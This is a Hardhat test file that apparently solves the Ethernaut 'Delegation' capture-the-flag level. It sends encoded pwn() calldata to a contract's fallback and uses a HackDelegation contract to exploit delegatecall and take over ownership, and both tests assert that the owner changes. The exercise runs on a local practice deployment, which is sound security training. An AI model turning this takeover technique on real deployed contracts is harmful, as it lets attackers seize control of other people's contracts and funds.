const { deployments, ethers, getNamedAccounts } = require("hardhat")
const { assert, expect } = require("chai")

  describe("Delegation", async function() {
    let delegation, delegate, hackDelegation, deployer, deployer2

    beforeEach(async () => {
      deployer = (await getNamedAccounts()).deployer
      await deployments.fixture(["delegation"])
      delegate = await ethers.getContract("Delegate", deployer)
      delegation = await ethers.getContract("Delegation", deployer)
      hackDelegation = await ethers.getContract("HackDelegation", deployer2)
    })

    describe("constructor", async () => {
      it("check owner", async () => {
        const delegationOwner_before = await delegation.owner()
        const delegateOwner_before = await delegate.owner()

        console.log("Delegation owner before: ", delegationOwner_before)
        console.log("Delegate owner before: ", delegateOwner_before)


        // call fallback
        const accounts = await ethers.getSigners();
        const hacker = accounts[3];
        // console.log("hacker: ", hacker.address)
        const abi = ['function pwn()'];
        const iface = new ethers.utils.Interface(abi);
        const fname = iface.encodeFunctionData("pwn");


        const tx = await hacker.sendTransaction({
          to: delegation.address,
          gasLimit: 50000,
          data: ethers.utils.hexlify(fname)
        });

        const delegationOwner_after = await delegation.owner()
        const delegateOwner_after = await delegate.owner()

        console.log("Delegation owner after: ", delegationOwner_after)
        console.log("Delegate owner after: ", delegateOwner_after)

        assert.notEqual(delegationOwner_before, delegationOwner_after);
        // assert.notEqual(delegateOwner_before, delegateOwner_after);
      })

      it("call hackdelegation", async () => {
        const accounts = await ethers.getSigners();
        const hacker = accounts[5];

        const delegationOwner_before = await delegation.owner()

        const tx = await hackDelegation.hackDelegation();

        const delegationOwner_after = await delegation.owner()

        assert.notEqual(delegationOwner_before, delegationOwner_after);

      })

    })
})
